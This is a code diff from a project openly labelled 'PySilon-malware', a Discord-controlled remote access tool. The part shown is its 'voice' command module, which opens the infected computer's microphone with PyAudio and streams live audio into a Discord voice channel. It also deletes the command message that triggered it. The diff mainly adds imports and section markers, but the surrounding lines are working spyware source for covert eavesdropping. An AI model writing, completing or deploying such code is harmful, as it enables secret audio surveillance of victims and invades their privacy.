@@ -1,8 +1,12 @@
+#<imports>
 import resources.modules.misc as pysilon_misc
 import pyaudio
+import discord
 import sys
 import os
+#</imports>
 
+#<command>
 @client.command(name="voice")
 async def live_mic(ctx, option=None):
     await ctx.message.delete()
@@ -21,7 +25,9 @@ async def live_mic(ctx, option=None):
         embed = discord.Embed(title="📛 Error",description='```Syntax: .voice <join/leave>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+#</command>
 
+#<preload>
 bundle_dir = os.path.dirname(os.path.abspath(__file__))
 opuslib_path = bundle_dir + 'resources/modules/libopus-0.x64.dll'
 discord.opus.load_opus(opuslib_path)
@@ -32,3 +38,4 @@ class PyAudioPCM(discord.AudioSource):
         self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
     def read(self) -> bytes:
         return self.input_stream.read(self.chunks)
+#</preload>
